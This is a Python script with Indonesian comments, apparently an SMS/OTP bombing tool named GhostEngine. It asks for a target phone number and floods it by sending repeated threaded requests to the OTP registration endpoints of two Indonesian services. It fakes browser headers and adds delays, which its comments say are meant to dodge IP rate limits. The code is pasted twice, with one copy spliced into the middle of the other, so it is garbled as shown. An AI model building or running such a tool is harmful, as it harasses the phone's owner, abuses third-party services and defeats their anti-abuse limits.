import requests
import threading
import time
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class GhostEngine:
    def __init__(self, target):
        self.target = target.replace("+62", "0") if target.startswith("+62") else target
        self.success = 0
        self.failed = 0
        
    def get_session(self):
        """Membuat sesi palsu agar terlihat seperti Browser asli"""
        session = requests.Session()
        retry = Retry(connect=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Identitas Browser yang sangat lengkap
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
        })
        return session

    def attack(self, api_name):
        s = self.get_session()
        try:
            if api_name == "SKILL":
                url = "https://dashboard.skillacademy.com/api/v1/auth/otp"
                json_data = {"phoneNumber": self.target}
            elif api_name == "MATAHARI":
                url = "https://api.matahari.com/v1/auth/otp"
                json_data = {"phone": self.target, "type": "register"}
            
            # Trik: Tambahin jeda milidetik sebelum nembak biar gak tabrakan
            time.sleep(random.uniform(0.1, 0.9))
import requests
import threading
import time
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class GhostEngine:
    def __init__(self, target):
        self.target = target.replace("+62", "0") if target.startswith("+62") else target
        self.success = 0
        self.failed = 0
        
    def get_session(self):
        """Membuat sesi palsu agar terlihat seperti Browser asli"""
        session = requests.Session()
        retry = Retry(connect=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Identitas Browser yang sangat lengkap
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
        })
        return session

    def attack(self, api_name):
        s = self.get_session()
        try:
            if api_name == "SKILL":
                url = "https://dashboard.skillacademy.com/api/v1/auth/otp"
                json_data = {"phoneNumber": self.target}
            elif api_name == "MATAHARI":
                url = "https://api.matahari.com/v1/auth/otp"
                json_data = {"phone": self.target, "type": "register"}
            
            # Trik: Tambahin jeda milidetik sebelum nembak biar gak tabrakan
            time.sleep(random.uniform(0.1, 0.9))
            
            res = s.post(url, json=json_data, timeout=15)
            if res.status_code == 200:
                self.success += 1
                print(f"[\033[32mSUCCESS\033[0m] {api_name} Meledak!")
            else:
                self.failed += 1
                print(f"[\033[31mFAILED\033[0m] {api_name} Diblokir ({res.status_code})")
        except:
            self.failed += 1
            print(f"[\033[33mTIMEOUT\033[0m] Jalur {api_name} Mampet")

# --- Eksekusi ---
target = input("Target (08xxx): ")
bot = GhostEngine(target)
while True:
    t1 = threading.Thread(target=bot.attack, args=("SKILL",))
    t2 = threading.Thread(target=bot.attack, args=("MATAHARI",))
    t1.start()
    t2.start()
    # Jeda antar gelombang biar gak kena limit IP
    time.sleep(12) 
            
            res = s.post(url, json=json_data, timeout=15)
            if res.status_code == 200:
                self.success += 1
                print(f"[\033[32mSUCCESS\033[0m] {api_name} Meledak!")
            else:
                self.failed += 1
                print(f"[\033[31mFAILED\033[0m] {api_name} Diblokir ({res.status_code})")
        except:
            self.failed += 1
            print(f"[\033[33mTIMEOUT\033[0m] Jalur {api_name} Mampet")

# --- Eksekusi ---
target = input("Target (08xxx): ")
bot = GhostEngine(target)
while True:
    t1 = threading.Thread(target=bot.attack, args=("SKILL",))
    t2 = threading.Thread(target=bot.attack, args=("MATAHARI",))
    t1.start()
    t2.start()
    # Jeda antar gelombang biar gak kena limit IP
    time.sleep(12) 
            
